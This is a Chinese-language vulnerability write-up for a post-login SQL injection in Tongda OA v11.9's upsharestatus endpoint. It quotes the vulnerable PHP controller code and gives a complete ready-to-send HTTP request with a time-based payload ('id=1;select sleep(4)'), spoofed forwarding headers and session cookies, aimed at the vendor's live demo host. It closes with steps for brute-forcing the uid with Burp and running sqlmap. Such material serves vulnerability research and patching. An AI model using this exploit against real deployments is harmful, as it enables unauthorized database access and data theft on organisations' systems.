# 通达OA v11.9 upsharestatus 后台SQL注入漏洞

## 漏洞描述

通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞

## 漏洞影响

```
通达OA <=  v11.9
```

## 环境搭建

```plain
https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe
```

双击安装

![image-20220209112211968](./images/202202091122432.png)

## 漏洞复现

漏洞文件位 **webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php**

```php
public function actionUpsharestatus()
	{
		Yii::$app->response->format = yii\web\Response::FORMAT_JSON;
		$data = modules\appdesign\models\AppUtils::toGBK($_POST);

		if (modules\portal\controllers\intval($data["uid"]) == $_SESSION["LOGIN_UID"]) {
			modules\portal\models\PortalWorkbench::updateAll(array("state" => "{$data["status"]}"), "id={$data["id"]}");
		}
		else if ($data["status"] == 1) {
			modules\portal\models\PortalWorkbenchState::deleteAll(array("wids" => "{$data["id"]}", "uid" => "{$_SESSION["LOGIN_UID"]}"));
		}
		else {
			$Work = new modules\portal\models\PortalWorkbenchState();
			$Work->wids = $data["id"];
			$Work->uid = $_SESSION["LOGIN_UID"];
			$Work->save();
		}

		$dataBack = array("status" => 1, "msg" => modules\portal\controllers\_("操作成功"));
		$dataBack = modules\appdesign\models\AppUtils::toUTF8($dataBack);
		return $dataBack;
	}
```

![image-20220209112228111](./images/202202091122220.png)

其中 **updateAll()** 函数并没有使用防止 SQL注入的 **sql_injection()** 来防止注入

**webroot/inc/conn.php**

![image-20220209112245130](./images/202202091122281.png)

所以这里就出现了 id 参数存在注入的情况，请求包如下

```plain
POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1
Host: oa.tongda2000.com
Connection: close
Content-Length: 36
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Origin: https://oa.tongda2000.com
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1

uid=15&status=1&id=1;select sleep(4)
```

注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应

例如这里使用官网的测试账户 uid 遍历出为 15

![image-20220209112303802](./images/202202091123903.png)

如果uid错误则不会出现时间延迟，将请求包放入 Sqlmap跑一下

![image-20220209112326082](./images/202202091123191.png)